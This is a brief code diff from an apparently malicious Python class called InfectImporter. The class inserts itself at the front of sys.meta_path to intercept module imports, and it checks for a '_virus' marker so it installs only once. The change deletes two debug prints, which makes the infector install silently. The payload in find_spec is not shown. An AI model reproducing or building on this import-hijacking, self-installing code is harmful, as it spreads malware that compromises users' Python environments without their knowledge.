@@ -47,10 +47,8 @@ class InfectImporter():
         self.inside = False
         for obj in sys.meta_path:
             if getattr(obj, "_virus", None):
-                print("found")
                 break
         else:
-            print ("adding infector")
             sys.meta_path = [self] + sys.meta_path
 
     def find_spec(self, name, path=None, target=None):
